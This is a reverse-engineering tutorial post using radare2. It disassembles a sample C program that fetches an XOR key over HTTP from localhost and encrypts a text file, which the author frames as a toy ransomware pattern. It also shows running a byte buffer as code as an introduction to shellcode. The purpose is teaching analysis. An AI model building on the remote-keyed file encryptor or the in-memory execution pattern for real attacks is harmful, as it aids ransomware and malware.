---
layout: post
title:  "Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)"
tags: [reversing, c, radare]
featured_image_thumbnail: assets/images/radare2/radare2_17.png
featured_image: assets/images/radare2/radare2_17.png
---

### Performing get requests with UNIX sockets

Sockets are the very fundamentals of networking in any operating system. You can be sure that many applications you daily use work with sockets on the inside eventhough they call custom made functions.

So any particular network protocol like HTTP or DNS can be "emulated" or better said, constructed over sockets, we only need to know about how it works, bout the format like specific headers, sizes, request-response schema and so to implement it with sockets. At the end we'll just need to create a buffer and fill its bytes correctly then call write() over the specific socket right?

Today we'll go over a very common protocol, HTTP. This protocol is used for www naviation, no news here but it is also (severely) used in malware for implementing command and control mechanisms.

Think for example about the average ransomware yes it may come with some crypto key hardcoded inside but on that case the thing won't be very useful/dangerous cause the key would be easily extracted from the binary by the reverser and the decryption of files will be possible. But what if the key comes over the network under certain conditions and then is no more used? Then the only possibilty comes with intercepting all of the traffic, which may be difficult cause the program may use https or debugging/reading the progams memory while it is crypting and that is a thing the average user won't probably do...

So in this following example I wrote a very simple program that will retrieve a 10 digit KEY from a remote server by performing an HTTP GET request and then use it to XOR a txt file on disk.

_I need to say that I do not encourage you to write ransomware or any kind of malware, you may face legal consequences if you do it_

Here's the code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h> 
#include <fcntl.h>
#include <stdlib.h>

#define BSIZE 256
#define KSIZE 11
// Lame sample routine for key extraction from an http response
void getKey(char buf[], char key[]){
    int i = 0;
    int kg = 0;
    int ki = 0;

    while(i < BSIZE && kg == 0){
        if(buf[i]== '<' && buf[i+1] == 'k' && buf[i+2] == '>' ){

            for(int j=i+3; j < KSIZE+i+2; j++){
                key[ki] = buf[j];
                ki = ki+1;
            }
            kg = 1;
        }
        i = i+1;
    }
}
// Lame sample routine for byte array xor
void cryp(char key[], char buf[]){

    for(int i = 0; i < KSIZE; i ++){
        buf[i] ^= key[i];
    }

}
// open a file xor the content and dump it to another file
void crypFile(char file[], char key[]){

    int infile, outfile; 
    char buff[KSIZE];
    infile = open (file, O_RDONLY , 0644); 
    outfile = open ("crypted.cry", O_WRONLY | O_CREAT, 0644);
    while(read(infile, &buff, KSIZE)){ 
        cryp(key, buff);

        write(outfile, &buff, KSIZE);
    }
    close (infile); 
    close (outfile);

}

int main(int argc, char *argv[]) {
   int sockfd, portno, n;
   struct sockaddr_in serv_addr;
   struct hostent *server;
   char key[KSIZE];
   char request[] = "GET /sh HTTP/1.1\r\nUser-Agent: nc/0.0.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\n\r\n";
   char buffer[BSIZE];

   portno = 80;
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   server = gethostbyname("127.0.0.1");

   
   bzero((char *) &serv_addr, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
   serv_addr.sin_port = htons(portno);

   if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
      exit(1);
   }

   bzero(buffer,BSIZE);

   n = write(sockfd, request, strlen(request));

   bzero(buffer,BSIZE);
   n = read(sockfd, buffer, BSIZE);
   getKey(buffer, key);

   crypFile("sample.txt",key);
   return 0;
}
```

As you see the algorithm is simple, first we ask the remote server for the key, then the server will return a response containing data related to the status of the request like http headers and such, then the body will contain the k tagged key, so we'll need to parse it, getKey will extract the key and tne crypFile will use it to xor the file in chunks of key size.

We start with the main function as usual:

```c
[0x55fa6e273bc4]> pdf
            ; DATA XREF from entry0 @ 0x55fa6e2738dd
┌ 614: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_1b0h @ rbp-0x1b0
│           ; var int64_t var_1a4h @ rbp-0x1a4
│           ; var int64_t var_194h @ rbp-0x194
│           ; var int64_t var_190h @ rbp-0x190
│           ; var int64_t var_18ch @ rbp-0x18c
│           ; var int64_t var_188h @ rbp-0x188
│           ; var int64_t var_180h @ rbp-0x180
│           ; var int64_t var_17eh @ rbp-0x17e
│           ; var int64_t var_16bh @ rbp-0x16b
│           ; var int64_t var_160h @ rbp-0x160
│           ; var int64_t var_158h @ rbp-0x158
│           ; var int64_t var_150h @ rbp-0x150
│           ; var int64_t var_148h @ rbp-0x148
│           ; var int64_t var_140h @ rbp-0x140
│           ; var int64_t var_138h @ rbp-0x138
│           ; var int64_t var_130h @ rbp-0x130
│           ; var int64_t var_128h @ rbp-0x128
│           ; var int64_t var_120h @ rbp-0x120
│           ; var int64_t var_118h @ rbp-0x118
│           ; var int64_t var_114h @ rbp-0x114
│           ; var int64_t var_110h @ rbp-0x110
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x55fa6e273bc4      55             push rbp
│           0x55fa6e273bc5      4889e5         mov rbp, rsp
│           0x55fa6e273bc8      4881ecb00100.  sub rsp, 0x1b0
│           0x55fa6e273bcf      89bd5cfeffff   mov dword [var_1a4h], edi ; argc
│           0x55fa6e273bd5      4889b550feff.  mov qword [var_1b0h], rsi ; argv
│           0x55fa6e273bdc      64488b042528.  mov rax, qword fs:[0x28]
│           0x55fa6e273be5      488945f8       mov qword [var_8h], rax
│           0x55fa6e273be9      31c0           xor eax, eax
│           0x55fa6e273beb      48b847455420.  movabs rax, 0x79656b2f20544547 ; 'GET /key'
│           0x55fa6e273bf5      48ba2e747874.  movabs rdx, 0x545448207478742e ; '.txt HTT'
│           0x55fa6e273bff      488985a0feff.  mov qword [var_160h], rax
│           0x55fa6e273c06      488995a8feff.  mov qword [var_158h], rdx
│           0x55fa6e273c0d      48b8502f312e.  movabs rax, 0x550a0d312e312f50
│           0x55fa6e273c17      48ba7365722d.  movabs rdx, 0x6e6567412d726573 ; 'ser-Agen'
│           0x55fa6e273c21      488985b0feff.  mov qword [var_150h], rax
│           0x55fa6e273c28      488995b8feff.  mov qword [var_148h], rdx
│           0x55fa6e273c2f      48b8743a206e.  movabs rax, 0x2e302f636e203a74 ; 't: nc/0.'
│           0x55fa6e273c39      48ba302e310d.  movabs rdx, 0x736f480a0d312e30
│           0x55fa6e273c43      488985c0feff.  mov qword [var_140h], rax
│           0x55fa6e273c4a      488995c8feff.  mov qword [var_138h], rdx
│           0x55fa6e273c51      48b8743a2031.  movabs rax, 0x302e373231203a74 ; 't: 127.0'
│           0x55fa6e273c5b      48ba2e302e31.  movabs rdx, 0x63410a0d312e302e
│           0x55fa6e273c65      488985d0feff.  mov qword [var_130h], rax
│           0x55fa6e273c6c      488995d8feff.  mov qword [var_128h], rdx
│           0x55fa6e273c73      48b863657074.  movabs rax, 0x2f2a203a74706563 ; 'cept: */'
│           0x55fa6e273c7d      488985e0feff.  mov qword [var_120h], rax
│           0x55fa6e273c84      c785e8feffff.  mov dword [var_118h], 0xd0a0d2a
│           0x55fa6e273c8e      66c785ecfeff.  mov word [var_114h], 0xa
│           0x55fa6e273c97      c7856cfeffff.  mov dword [var_194h], 0x50 ; 'P' ; 80
│           0x55fa6e273ca1      ba00000000     mov edx, 0
│           0x55fa6e273ca6      be01000000     mov esi, 1
│           0x55fa6e273cab      bf02000000     mov edi, 2
│           0x55fa6e273cb0      e8ebfbffff     call sym.imp.socket     ; int socket(int domain, int type, int protocol)
│           0x55fa6e273cb5      898570feffff   mov dword [var_190h], eax
│           0x55fa6e273cbb      488d3dfe0100.  lea rdi, str.127.0.0.1  ; 0x55fa6e273ec0 ; "127.0.0.1"
│           0x55fa6e273cc2      e879fbffff     call sym.imp.gethostbyname
│           0x55fa6e273cc7      48898578feff.  mov qword [var_188h], rax
│           0x55fa6e273cce      488d8580feff.  lea rax, [var_180h]
│           0x55fa6e273cd5      be10000000     mov esi, 0x10           ; 16
│           0x55fa6e273cda      4889c7         mov rdi, rax
│           0x55fa6e273cdd      e88efbffff     call sym.imp.bzero      ; void bzero(void *s, size_t n)
│           0x55fa6e273ce2      66c78580feff.  mov word [var_180h], 2
│           0x55fa6e273ceb      488b8578feff.  mov rax, qword [var_188h]
│           0x55fa6e273cf2      8b4014         mov eax, dword [rax + 0x14]
│           0x55fa6e273cf5      4863d0         movsxd rdx, eax
│           0x55fa6e273cf8      488b8578feff.  mov rax, qword [var_188h]
│           0x55fa6e273cff      488b4018       mov rax, qword [rax + 0x18]
│           0x55fa6e273d03      488b00         mov rax, qword [rax]
│           0x55fa6e273d06      488d8d80feff.  lea rcx, [var_180h]
│           0x55fa6e273d0d      4883c104       add rcx, 4
│           0x55fa6e273d11      4889ce         mov rsi, rcx
│           0x55fa6e273d14      4889c7         mov rdi, rax
│           0x55fa6e273d17      e834fbffff     call sym.imp.bcopy
│           0x55fa6e273d1c      8b856cfeffff   mov eax, dword [var_194h]
│           0x55fa6e273d22      0fb7c0         movzx eax, ax
│           0x55fa6e273d25      89c7           mov edi, eax
│           0x55fa6e273d27      e8e4faffff     call sym.imp.htons
│           0x55fa6e273d2c      66898582feff.  mov word [var_17eh], ax
│           0x55fa6e273d33      488d8d80feff.  lea rcx, [var_180h]
│           0x55fa6e273d3a      8b8570feffff   mov eax, dword [var_190h]
│           0x55fa6e273d40      ba10000000     mov edx, 0x10           ; 16
│           0x55fa6e273d45      4889ce  
```
Again this is very similar to what we saw on the previous tutorial.

The program starts by loading the get request string

```c
│           0x55fa6e273beb      48b847455420.  movabs rax, 0x79656b2f20544547 ; 'GET /key'
│           0x55fa6e273bf5      48ba2e747874.  movabs rdx, 0x545448207478742e ; '.txt HTT'
│           0x55fa6e273bff      488985a0feff.  mov qword [var_160h], rax
│           0x55fa6e273c06      488995a8feff.  mov qword [var_158h], rdx
│           0x55fa6e273c0d      48b8502f312e.  movabs rax, 0x550a0d312e312f50
│           0x55fa6e273c17      48ba7365722d.  movabs rdx, 0x6e6567412d726573 ; 'ser-Agen'
│           0x55fa6e273c21      488985b0feff.  mov qword [var_150h], rax
│           0x55fa6e273c28      488995b8feff.  mov qword [var_148h], rdx
│           0x55fa6e273c2f      48b8743a206e.  movabs rax, 0x2e302f636e203a74 ; 't: nc/0.'
│           0x55fa6e273c39      48ba302e310d.  movabs rdx, 0x736f480a0d312e30
│           0x55fa6e273c43      488985c0feff.  mov qword [var_140h], rax
│           0x55fa6e273c4a      488995c8feff.  mov qword [var_138h], rdx
│           0x55fa6e273c51      48b8743a2031.  movabs rax, 0x302e373231203a74 ; 't: 127.0'
│           0x55fa6e273c5b      48ba2e302e31.  movabs rdx, 0x63410a0d312e302e
│           0x55fa6e273c65      488985d0feff.  mov qword [var_130h], rax
│           0x55fa6e273c6c      488995d8feff.  mov qword [var_128h], rdx
│           0x55fa6e273c73      48b863657074.  movabs rax, 0x2f2a203a74706563 ; 'cept: */'
│           0x55fa6e273c7d      488985e0feff.  mov qword [var_120h], rax
│           0x55fa6e273c84      c785e8feffff.  mov dword [var_118h], 0xd0a0d2a
│           0x55fa6e273c8e      66c785ecfeff.  mov word [var_114h], 0xa
│           0x55fa6e273c97      c7856cfeffff.  mov dword [var_194h], 0x50 ; 'P' ; 80
```
So the string gets loaded well in memory:
```c
[0x55fa6e273cb0]> pxw @ 0x7ffc9a81e5c0
0x7ffc9a81e5c0  0x20544547 0x79656b2f 0x7478742e 0x54544820  GET /key.txt HTT
0x7ffc9a81e5d0  0x2e312f50 0x550a0d31 0x2d726573 0x6e656741  P/1.1..User-Agen
0x7ffc9a81e5e0  0x6e203a74 0x2e302f63 0x0d312e30 0x736f480a  t: nc/0.0.1..Hos
0x7ffc9a81e5f0  0x31203a74 0x302e3732 0x312e302e 0x63410a0d  t: 127.0.0.1..Ac
0x7ffc9a81e600  0x74706563 0x2f2a203a 0x0d0a0d2a 0x0000000a  cept: */*.......
```
Then comes the socket creation and initialization through connect
```c
           0x55fa6e273cb0 b    e8ebfbffff     call sym.imp.socket     ; int socket(int domain, int type, int protocol)
│           0x55fa6e273cb5      898570feffff   mov dword [var_190h], eax
│           0x55fa6e273cbb      488d3dfe0100.  lea rdi, str.127.0.0.1  ; 0x55fa6e273ec0 ; "127.0.0.1"
│           0x55fa6e273cc2      e879fbffff     call sym.imp.gethostbyname
│           0x55fa6e273cc7      48898578feff.  mov qword [var_188h], rax
│           0x55fa6e273cce      488d8580feff.  lea rax, [var_180h]
│           0x55fa6e273cd5      be10000000     mov esi, 0x10           ; 16
│           0x55fa6e273cda      4889c7         mov rdi, rax
```
As well as the buffer initialization with bzero, nothing much to comment.

Then the read from the server:
```c
│           0x55fa6e273dd5      e856faffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           ;-- rip:
│           0x55fa6e273dda b    898574feffff   mov dword [var_18ch], eax
```
So after the read we see the key has been delivered:
```c
[0x55fa6e273dda]> pxw @ 0x7ffc9a81e610
0x7ffc9a81e610  0x50545448 0x312e312f 0x30303220 0x0d4b4f20  HTTP/1.1 200 OK.
0x7ffc9a81e620  0x7461440a 0x54203a65 0x202c7568 0x4a203430  .Date: Thu, 04 J
0x7ffc9a81e630  0x32206e75 0x20303230 0x333a3131 0x39323a31  un 2020 11:31:29
0x7ffc9a81e640  0x544d4720 0x65530a0d 0x72657672 0x7041203a   GMT..Server: Ap
0x7ffc9a81e650  0x65686361 0x342e322f 0x2039322e 0x75625528  ache/2.4.29 (Ubu
0x7ffc9a81e660  0x2975746e 0x614c0a0d 0x4d2d7473 0x6669646f  ntu)..Last-Modif
0x7ffc9a81e670  0x3a646569 0x64655720 0x3330202c 0x6e754a20  ied: Wed, 03 Jun
0x7ffc9a81e680  0x32303220 0x38302030 0x3a36303a 0x47203434   2020 08:06:44 G
0x7ffc9a81e690  0x0a0d544d 0x67615445 0x3122203a 0x61352d32  MT..ETag: "12-5a
0x7ffc9a81e6a0  0x38393237 0x33303432 0x22353031 0x63410a0d  72982403105"..Ac
0x7ffc9a81e6b0  0x74706563 0x6e61522d 0x3a736567 0x74796220  cept-Ranges: byt
0x7ffc9a81e6c0  0x0a0d7365 0x746e6f43 0x2d746e65 0x676e654c  es..Content-Leng
0x7ffc9a81e6d0  0x203a6874 0x0a0d3831 0x746e6f43 0x2d746e65  th: 18..Content-
0x7ffc9a81e6e0  0x65707954 0x6574203a 0x702f7478 0x6e69616c  Type: text/plain
0x7ffc9a81e6f0  0x0a0d0a0d 0x303e6b3c 0x34333231 0x38373635  ....<k>012345678
0x7ffc9a81e700  0x6b2f3c39 0x00000a3e 0x00000000 0x00000000  9</k>...........
```
Bus as said, the server included http headers and useless information, we proceed to parse the key:
```c
[0x55fa6e2739ca]> pdf
            ; CALL XREF from main @ 0x55fa6e273df4
            ;-- rip:
┌ 198: sym.getKey (int64_t arg1, int64_t arg2);
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg2 @ rsi
│           0x55fa6e2739ca      55             push rbp
│           0x55fa6e2739cb      4889e5         mov rbp, rsp
│           0x55fa6e2739ce      48897de8       mov qword [var_18h], rdi ; arg1
│           0x55fa6e2739d2      488975e0       mov qword [var_20h], rsi ; arg2
│           0x55fa6e2739d6      c745f0000000.  mov dword [var_10h], 0
│           0x55fa6e2739dd      c745f4000000.  mov dword [var_ch], 0
│           0x55fa6e2739e4      c745f8000000.  mov dword [var_8h], 0
│       ┌─< 0x55fa6e2739eb      e98a000000     jmp 0x55fa6e273a7a
│      ┌──> 0x55fa6e2739f0      8b45f0         mov eax, dword [var_10h]
│      ╎│   0x55fa6e2739f3      4863d0         movsxd rdx, eax
│      ╎│   0x55fa6e2739f6      488b45e8       mov rax, qword [var_18h]
│      ╎│   0x55fa6e2739fa      4801d0         add rax, rdx
│      ╎│   0x55fa6e2739fd      0fb600         movzx eax, byte [rax]
│      ╎│   0x55fa6e273a00      3c3c           cmp al, 0x3c            ; 60
│     ┌───< 0x55fa6e273a02      7572           jne 0x55fa6e273a76
│     │╎│   0x55fa6e273a04      8b45f0         mov eax, dword [var_10h]
│     │╎│   0x55fa6e273a07      4898           cdqe
│     │╎│   0x55fa6e273a09      488d5001       lea rdx, [rax + 1]
│     │╎│   0x55fa6e273a0d      488b45e8       mov rax, qword [var_18h]
│     │╎│   0x55fa6e273a11      4801d0         add rax, rdx
│     │╎│   0x55fa6e273a14      0fb600         movzx eax, byte [rax]
│     │╎│   0x55fa6e273a17      3c6b           cmp al, 0x6b            ; 107
│    ┌────< 0x55fa6e273a19      755b           jne 0x55fa6e273a76
│    ││╎│   0x55fa6e273a1b      8b45f0         mov eax, dword [var_10h]
│    ││╎│   0x55fa6e273a1e      4898           cdqe
│    ││╎│   0x55fa6e273a20      488d5002       lea rdx, [rax + 2]
│    ││╎│   0x55fa6e273a24      488b45e8       mov rax, qword [var_18h]
│    ││╎│   0x55fa6e273a28      4801d0         add rax, rdx
│    ││╎│   0x55fa6e273a2b      0fb600         movzx eax, byte [rax]
│    ││╎│   0x55fa6e273a2e      3c3e           cmp al, 0x3e            ; 62
│   ┌─────< 0x55fa6e273a30      7544           jne 0x55fa6e273a76
│   │││╎│   0x55fa6e273a32      8b45f0         mov eax, dword [var_10h]
│   │││╎│   0x55fa6e273a35      83c003         add eax, 3
│   │││╎│   0x55fa6e273a38      8945fc         mov dword [var_4h], eax
│  ┌──────< 0x55fa6e273a3b      eb27           jmp 0x55fa6e273a64
│ ┌───────> 0x55fa6e273a3d      8b45fc         mov eax, dword [var_4h]
│ ╎││││╎│   0x55fa6e273a40      4863d0         movsxd rdx, eax
│ ╎││││╎│   0x55fa6e273a43      488b45e8       mov rax, qword [var_18h]
│ ╎││││╎│   0x55fa6e273a47      4801d0         add rax, rdx
│ ╎││││╎│   0x55fa6e273a4a      8b55f8         mov edx, dword [var_8h]
│ ╎││││╎│   0x55fa6e273a4d      4863ca         movsxd rcx, edx
│ ╎││││╎│   0x55fa6e273a50      488b55e0       mov rdx, qword [var_20h]
│ ╎││││╎│   0x55fa6e273a54      4801ca         add rdx, rcx
│ ╎││││╎│   0x55fa6e273a57      0fb600         movzx eax, byte [rax]
│ ╎││││╎│   0x55fa6e273a5a      8802           mov byte [rdx], al
│ ╎││││╎│   0x55fa6e273a5c      8345f801       add dword [var_8h], 1
│ ╎││││╎│   0x55fa6e273a60      8345fc01       add dword [var_4h], 1
│ ╎││││╎│   ; CODE XREF from sym.getKey @ 0x55fa6e273a3b
│ ╎└──────> 0x55fa6e273a64      8b45f0         mov eax, dword [var_10h]
│ ╎ │││╎│   0x55fa6e273a67      83c00d         add eax, 0xd            ; 13
│ ╎ │││╎│   0x55fa6e273a6a      3945fc         cmp dword [var_4h], eax
│ └───────< 0x55fa6e273a6d      7cce           jl 0x55fa6e273a3d
│   │││╎│   0x55fa6e273a6f      c745f4010000.  mov dword [var_ch], 1
│   └└└───> 0x55fa6e273a76      8345f001       add dword [var_10h], 1
│      ╎│   ; CODE XREF from sym.getKey @ 0x55fa6e2739eb
│      ╎└─> 0x55fa6e273a7a      817df0ff0000.  cmp dword [var_10h], 0xff
│      ╎┌─< 0x55fa6e273a81      7f0a           jg 0x55fa6e273a8d
│      ╎│   0x55fa6e273a83      837df400       cmp dword [var_ch], 0
│      └──< 0x55fa6e273a87      0f8463ffffff   je 0x55fa6e2739f0
│       └─> 0x55fa6e273a8d      90             nop
│           0x55fa6e273a8e      5d             pop rbp
└           0x55fa6e273a8f      c3             ret
[0x55fa6e2739ca]> 
```
Getkey function is a bit chaotic but let's focus on the relevant stuff.

```c
│      ╎│   0x55fa6e2739fd      0fb600         movzx eax, byte [rax]
│      ╎│   0x55fa6e273a00      3c3c           cmp al, 0x3c            ; 60
│     ┌───< 0x55fa6e273a02      7572           jne 0x55fa6e273a76
│     │╎│   0x55fa6e273a04      8b45f0         mov eax, dword [var_10h]
│     │╎│   0x55fa6e273a07      4898           cdqe
│     │╎│   0x55fa6e273a09      488d5001       lea rdx, [rax + 1]
│     │╎│   0x55fa6e273a0d      488b45e8       mov rax, qword [var_18h]
│     │╎│   0x55fa6e273a11      4801d0         add rax, rdx
│     │╎│   0x55fa6e273a14      0fb600         movzx eax, byte [rax]
│     │╎│   0x55fa6e273a17      3c6b           cmp al, 0x6b            ; 107
│    ┌────< 0x55fa6e273a19      755b           jne 0x55fa6e273a76
│    ││╎│   0x55fa6e273a1b      8b45f0         mov eax, dword [var_10h]
│    ││╎│   0x55fa6e273a1e      4898           cdqe
│    ││╎│   0x55fa6e273a20      488d5002       lea rdx, [rax + 2]
│    ││╎│   0x55fa6e273a24      488b45e8       mov rax, qword [var_18h]
│    ││╎│   0x55fa6e273a28      4801d0         add rax, rdx
│    ││╎│   0x55fa6e273a2b      0fb600         movzx eax, byte [rax]
│    ││╎│   0x55fa6e273a2e      3c3e           cmp al, 0x3e            ; 62
│   ┌─────< 0x55fa6e273a30      7544           jne 0x55fa6e273a76
```
The program enters inside a loop going char by char on the buffer, then compares the actual character with 60 ='<'. Then it will compare the next 2 characters after it with 'k' and '>' It'll loop ten times extracting the key and thus it will be updated after the return through local var_10h
```c
[0x55fa6e273bc4]> pxw @ 0x7ffc9a81e5b5
0x7ffc9a81e5b5  0x33323130 0x37363534 0x47003938 0x2f205445  0123456789.GET /
```
Then the crypt function, I won't get into a lot of detail on it as we already saw it on previous tutorials in this course. So crypfile opens the file and goes chunk by chunk reading/xoring/writting.
```c
           0x55fa6e273b38      e823fdffff     call sym.imp.open       ; int open(const char *path, int oflag)
│           0x55fa6e273b3d      8945e8         mov dword [var_18h], eax
│       ┌─< 0x55fa6e273b40      eb2e           jmp 0x55fa6e273b70
│      ┌──> 0x55fa6e273b42      488d55ed       lea rdx, [var_13h]
│      ╎│   0x55fa6e273b46      488b45d0       mov rax, qword [var_30h]
│      ╎│   0x55fa6e273b4a      4889d6         mov rsi, rdx
│      ╎│   0x55fa6e273b4d      4889c7         mov rdi, rax
│      ╎│   0x55fa6e273b50      e83bffffff     call sym.cryp
│      ╎│   0x55fa6e273b55      488d4ded       lea rcx, [var_13h]
│      ╎│   0x55fa6e273b59      8b45e8         mov eax, dword [var_18h]
│      ╎│   0x55fa6e273b5c      ba0b000000     mov edx, 0xb            ; 11
│      ╎│   0x55fa6e273b61      4889ce         mov rsi, rcx
│      ╎│   0x55fa6e273b64      89c7           mov edi, eax
│      ╎│   0x55fa6e273b66      b800000000     mov eax, 0
│      ╎│   0x55fa6e273b6b      e870fcffff     call sym.imp.write      ; ssize_t write(int fd, const char *ptr, size_t nbytes)
│      ╎│   ; CODE XREF from sym.crypFile @ 0x55fa6e273b40
│      ╎└─> 0x55fa6e273b70      488d4ded       lea rcx, [var_13h]
│      ╎    0x55fa6e273b74      8b45e4         mov eax, dword [var_1ch]
│      ╎    0x55fa6e273b77      ba0b000000     mov edx, 0xb            ; 11
│      ╎    0x55fa6e273b7c      4889ce         mov rsi, rcx
│      ╎    0x55fa6e273b7f      89c7           mov edi, eax
│      ╎    0x55fa6e273b81      b800000000     mov eax, 0
│      ╎    0x55fa6e273b86      e8a5fcffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)
│      ╎    0x55fa6e273b8b      85c0           test eax, eax
│      └──< 0x55fa6e273b8d      75b3           jne 0x55fa6e273b42
```
And cryp goes char by char KSIZE chars and does the XOR with the key
```c
│      ┌──> 0x00000aa5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x00000aa8      4863d0         movsxd rdx, eax
│      ╎│   0x00000aab      488b45e0       mov rax, qword [var_20h]
│      ╎│   0x00000aaf      4801d0         add rax, rdx
│      ╎│   0x00000ab2      0fb630         movzx esi, byte [rax]
│      ╎│   0x00000ab5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x00000ab8      4863d0         movsxd rdx, eax
│      ╎│   0x00000abb      488b45e8       mov rax, qword [var_18h]
│      ╎│   0x00000abf      4801d0         add rax, rdx
│      ╎│   0x00000ac2      0fb608         movzx ecx, byte [rax]
│      ╎│   0x00000ac5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x00000ac8      4863d0         movsxd rdx, eax
│      ╎│   0x00000acb      488b45e0       mov rax, qword [var_20h]
│      ╎│   0x00000acf      4801d0         add rax, rdx
│      ╎│   0x00000ad2      31ce           xor esi, ecx
│      ╎│   0x00000ad4      89f2           mov edx, esi
│      ╎│   0x00000ad6      8810           mov byte [rax], dl
│      ╎│   0x00000ad8      8345fc01       add dword [var_4h], 1
│      ╎│   ; CODE XREF from sym.cryp @ 0xaa3
│      ╎└─> 0x00000adc      837dfc0a       cmp dword [var_4h], 0xa
│      └──< 0x00000ae0      7ec3           jle 0xaa5
```
Voilà!

Let's now move into a new topic that I think may be of great interest.

### Downloading and executing code in memory

#### Intro to shellcode

This post is not about shellcode writting, we'll go over that after some tutorials though. In here we'll just introduce you to a new concept linked to the socket topic whe are dealing wiht.

Let's start with this very simple program:
```c
#include <stdio.h>

void hello(){
    char h[] = "hello world";
    printf(h);
}

void main(){
    hello();
}
```
It contains a couple of functions right. One is the classical main function, the other one just prints the hello world. Let's inspect this second one:
```c
[0x7f4653774090]> s sym.hello
[0x5561e0c6c6aa]> pdf
            ; CALL XREF from main @ 0x5561e0c6c707
┌ 84: sym.hello ();
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           0x5561e0c6c6aa      55             push rbp
│           0x5561e0c6c6ab      4889e5         mov rbp, rsp
│           0x5561e0c6c6ae      4883ec20       sub rsp, 0x20
│           0x5561e0c6c6b2      64488b042528.  mov rax, qword fs:[0x28]
│           0x5561e0c6c6bb      488945f8       mov qword [var_8h], rax
│           0x5561e0c6c6bf      31c0           xor eax, eax
│           0x5561e0c6c6c1      48b868656c6c.  movabs rax, 0x6f77206f6c6c6568 ; 'hello wo'
│           0x5561e0c6c6cb      488945ec       mov qword [var_14h], rax
│           0x5561e0c6c6cf      c745f4726c64.  mov dword [var_ch], 0x646c72 ; 'rld'
│           0x5561e0c6c6d6      488d45ec       lea rax, [var_14h]
│           0x5561e0c6c6da      4889c7         mov rdi, rax
│           0x5561e0c6c6dd      b800000000     mov eax, 0
│           0x5561e0c6c6e2      e899feffff     call sym.imp.printf     ; int printf(const char *format)
│           0x5561e0c6c6e7      90             nop
│           0x5561e0c6c6e8      488b45f8       mov rax, qword [var_8h]
│           0x5561e0c6c6ec      644833042528.  xor rax, qword fs:[0x28]
│       ┌─< 0x5561e0c6c6f5      7405           je 0x5561e0c6c6fc
│       │   0x5561e0c6c6f7      e874feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       └─> 0x5561e0c6c6fc      c9             leave
└           0x5561e0c6c6fd      c3             ret
[0x5561e0c6c6aa]> 
```
As you can see, everyting is kind of "self-contained" inside this function. The string is "generated" and loaded inside the function, original register/stack values regarding to the calling block of code are kept/restored and calls (to printf) reference symbols that will be "common" in unix systems...

As you see the string is self generated in memory, would it be any way to self generate actual code in memory in a similar way?

_indeed_

If you look at the disasm, you'll see the opcodes right in the second column, that is essence of the binary program, that is what the "cpu" sees and deals with, so if we can just set a buffer containing the right set of opcodes in memory and manage to move the execution pointer there, common sense tells us that those will be executed as actual code. Again, we'll go in-depth on the topic further in the course but I think you get the main idea now.

Let's look at one simple example then go back to our hello world
```c
#include <stdio.h>
#include<string.h>
#include <stdint.h>

const uint8_t b2[4] = {
  0x90, 0x90, 0x90, 0x90
};

void main(){
    
    int (*func)();
    func = (int (*)()) b2;
    (int)(*func)();
    
}
```
So this program declares an array of (hex) bytes then declares a magic function that will basically set the instruction pointer at the beginning of the array. Let's see it inside r2, it will make more sense.
```c
[0x557a8fb295fa]> pdf
            ; DATA XREF from entry0 @ 0x557a8fb2950d
┌ 33: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_8h @ rbp-0x8
│           0x557a8fb295fa      55             push rbp
│           0x557a8fb295fb      4889e5         mov rbp, rsp
│           0x557a8fb295fe      4883ec10       sub rsp, 0x10
│           0x557a8fb29602      488d059b0000.  lea rax, obj.b2         ; 0x557a8fb296a4
│           0x557a8fb29609      488945f8       mov qword [var_8h], rax
│           0x557a8fb2960d      488b55f8       mov rdx, qword [var_8h]
│           0x557a8fb29611      b800000000     mov eax, 0
│           0x557a8fb29616      ffd2           call rdx
│           0x557a8fb29618      90             nop
│           0x557a8fb29619      c9             leave
└           0x557a8fb2961a      c3             ret
[0x557a8fb295fa]> 
```
If you know a bit about asm and opcodes you'll see that 0x90 is the opcode for the nop instruction, the nop instruction simply does nothing.

The program starts by moving the pointer to an address to rax = 0x557a8fb296a4
```c
[0x557a8fb295fa]> pxw @ 0x557a8fb296a4
0x557a8fb296a4  0x90909090 0x3b031b01 0x0000003c 0x00000006  .......;<.......
```
And that contains our nop-buffer. After a couple of instructions the programm will jump there by a call.

```c
│           ;-- rip:
│           0x557a8fb29616 b    ffd2           call rdx
│           0x557a8fb29618      90             nop
│           0x557a8fb29619      c9             leave
└           0x557a8fb2961a      c3             ret
[0x557a8fb29616]> dr rdx
0x557a8fb296a4
```
And as the bytes of our hex buffer can easily be translated to instructions, the program will "read it" as executable code as you see here:
```c
[0x557a8fb29616]> ds
[0x557a8fb296a4]> pd 10
            ; DATA XREF from main @ 0x557a8fb29602
            ;-- b2:
            ;-- rdx:
            ;-- rip:
            0x557a8fb296a4      90             nop
            0x557a8fb296a5      90             nop
            0x557a8fb296a6      90             nop
            0x557a8fb296a7      90             nop
            ;-- section..eh_frame_hdr:
            ;-- segment.GNU_EH_FRAME:
            ;-- .eh_frame_hdr:
